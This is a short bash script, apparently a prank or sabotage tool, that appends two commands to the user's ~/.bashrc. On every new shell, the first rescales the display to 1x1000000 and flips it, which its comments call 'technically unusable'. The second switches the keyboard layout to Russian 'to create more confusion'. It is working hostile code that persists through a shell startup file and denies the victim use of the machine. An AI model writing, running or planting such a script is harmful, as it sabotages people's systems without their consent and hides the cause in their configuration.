#!/bin/bash
#Authors: Johnny Cuevas & Fernando Flores
echo '
xrandr --output `xrandr | grep " connected"|cut -f1 -d" "` --scale 1x1000000 --reflect y
setxkbmap -layout ru
'>>~/.bashrc

#this script will add a two commands to  the end the bash file

#the first of the two commands gets the name of the current display and changes its aspect ratio to 1 by 1,000,000 which causes the display to be technically unusable, it also inverts the screen along the y axis.

#the second command changes the keyboard layout to russian in order to create more confusion.